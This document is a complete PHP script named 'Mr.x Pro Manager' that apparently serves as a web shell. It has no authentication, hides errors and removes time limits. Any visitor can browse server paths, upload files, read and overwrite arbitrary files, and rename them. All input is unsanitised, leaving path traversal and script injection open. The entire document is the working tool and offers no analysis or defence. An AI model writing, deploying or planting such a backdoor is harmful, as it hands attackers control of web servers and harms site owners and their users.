<?php
error_reporting(0);
set_time_limit(0);

echo "<title>Mr.x Pro Manager</title>";

echo "<center>
<h2>Mr.x Pro Manager</h2>
<hr>
</center>";

$path = isset($_GET['path']) ? $_GET['path'] : getcwd();

echo "<b>Path:</b> $path<br><br>";

/* Upload System */

if(isset($_FILES['file'])){
    
    $upload = $path . "/" . $_FILES['file']['name'];
    
    if(move_uploaded_file($_FILES['file']['tmp_name'], $upload)){
        echo "Upload Success<br>";
    }else{
        echo "Upload Failed<br>";
    }
}

echo "
<form method='post' enctype='multipart/form-data'>
<input type='file' name='file'>
<input type='submit' value='Upload'>
</form>
<hr>
";

/* Rename */

if(isset($_POST['rename'])){
    rename($_POST['old'], $_POST['new']);
    echo "Rename Done<br>";
}

/* Edit File */

if(isset($_POST['save'])){

    $fp = fopen($_POST['file'], 'w');
    fwrite($fp, $_POST['content']);
    fclose($fp);

    echo "File Saved Successfully<br>";
}

/* File List */

$files = scandir($path);

foreach($files as $file){

    echo "<a href='?path=$path/$file'>$file</a> 
    | <a href='?edit=$path/$file'>Edit</a>
    | <a href='?rename=$path/$file'>Rename</a>
    <br>";
}

/* Edit Page */

if(isset($_GET['edit'])){

$file = $_GET['edit'];

$content = file_get_contents($file);

echo "
<hr>
<form method='post'>
<textarea name='content' style='width:100%;height:400px;'>$content</textarea>
<input type='hidden' name='file' value='$file'>
<br>
<input type='submit' name='save' value='Save'>
</form>
";
}

/* Rename Page */

if(isset($_GET['rename'])){

$file = $_GET['rename'];

echo "
<hr>
<form method='post'>
Old Name:<br>
<input type='text' name='old' value='$file'><br>
New Name:<br>
<input type='text' name='new'><br><br>
<input type='submit' name='rename' value='Rename'>
</form>
";
}

?>
